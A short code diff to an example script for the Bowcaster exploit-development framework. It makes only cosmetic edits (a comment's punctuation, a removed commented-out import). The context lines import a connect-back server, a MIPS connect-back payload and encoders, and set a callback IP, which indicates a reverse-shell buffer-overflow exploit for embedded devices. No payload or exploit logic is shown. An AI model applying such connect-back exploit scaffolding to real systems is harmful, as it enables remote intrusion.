@@ -8,7 +8,7 @@
 
 
 #This is an exmaple using Crossbow's OverflowBuffer and SectionCreator classes
-#to build a buffer overflow
+#to build a buffer overflow.
 
 import os
 import struct
@@ -23,8 +23,6 @@ from bowcaster.servers.connectback_server import ConnectbackServer
 from bowcaster.payloads.mips.connectback_payload import ConnectbackPayload
 from bowcaster.encoders.mips import *
 
-
-#from bowcaster.encoders.mips import MipsUpperAlphaEncoder
 logger=Logging()
 
 CALLBACK_IP="192.168.127.10"
